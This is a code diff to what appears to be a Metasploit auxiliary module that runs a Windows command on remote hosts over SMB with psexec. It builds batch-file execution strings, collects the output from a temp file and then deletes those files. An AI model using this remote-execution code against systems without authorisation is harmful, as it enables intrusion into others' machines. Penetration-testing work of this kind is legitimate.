@@ -50,41 +50,32 @@ class Metasploit3 < Msf::Auxiliary
 
 	# This is the main controle method
 	def run_host(ip)
-		cmd = "C:\\WINDOWS\\SYSTEM32\\cmd.exe"
 		text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
-		bat = "C:\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
-
-		#Try and Connect to the target
-		begin
-			connect()
-		rescue StandardError => connecterror
-			print_error("Unable to connect to the target: #{connecterror}")
-			return
-		end
+		bat = "%WINDIR%\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
+		smbshare = datastore['SMBSHARE']
 
 		#Try and authenticate with given credentials
-		begin
-			smb_login()
-		rescue StandardError => autherror
-			print_error("Unable to authenticate with given credentials: #{autherror}")
-			return
+		if connect
+			begin
+				smb_login
+			rescue StandardError => autherror
+				print_error("Unable to authenticate with given credentials: #{autherror}")
+				return
+			end
+			if execute_command(smbshare, ip, text, bat)
+				o = get_output(smbshare, ip, text)
+			end
+			cleanup_after(smbshare, ip, text, bat)
 		end
-
-		smbshare = datastore['SMBSHARE']
-		
-		if execute_command(smbshare, ip, cmd, text, bat)
-			get_output(smbshare, ip, text)
-		end
-		cleanup_after(smbshare, ip, cmd, text, bat)
 	end
 
 
 
 	# Executes specified Windows Command
-	def execute_command(smbshare, ip, cmd, text, bat)
+	def execute_command(smbshare, ip, text, bat)
 		begin
 			#Try and execute the provided command
-			execute = "#{cmd} /C echo #{datastore['COMMAND']} ^> C:#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
+			execute = "%COMSPEC% /C echo #{datastore['COMMAND']} ^> %SYSTEMDRIVE%#{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
 			simple.connect(smbshare)
 			print_status("Executing your command on host: #{ip}")
 			psexec(smbshare, execute)
@@ -110,26 +101,43 @@ class Metasploit3 < Msf::Auxiliary
 				return
 			end
 			print_good("Command completed successfuly! Output from: #{ip}\r\n#{output}")
+			return output
 		rescue StandardError => output_error
 			print_error("#{ip} - Error getting command output. #{output_error.class}. #{output_error}.")
-			return output_error
+			return nil
 		end
 	end
 
 
 
 	# This is the cleanup method, removes .txt and .bat file/s created during execution-
-	def cleanup_after(smbshare, ip, cmd, text, bat)
+	def cleanup_after(smbshare, ip, text, bat)
 		begin
 			# Try and do cleanup command
-			cleanup = "#{cmd} /C del C:#{text} & del #{bat}"
+			cleanup = "%COMSPEC% /C del %SYSTEMDRIVE%#{text} & del #{bat}"
 			simple.connect(smbshare)
 			print_status("Executing cleanup on host: #{ip}")
 			psexec(smbshare, cleanup)
+			#if !check_cleanup(smbshare, ip, text)
+			#	print_error("#{ip} - Unable to cleanup.  Need to manually remove #{text} and #{bat} from the target.")
+			#end
 		rescue StandardError => cleanuperror
 			print_error("Unable to processes cleanup commands: #{cleanuperror}")
 			return cleanuperror
 		end
+	end
+
+
+
+	def check_cleanup(smbshare, ip, text)
+		simple.connect("\\\\#{ip}\\#{smbshare}")
+		if checktext = simple.open(text, 'ro')
+			check = false
+		else
+			check = true
+		end
+		simple.disconnect("\\\\#{ip}\\#{smbshare}")
+		return check
 	end
 
 
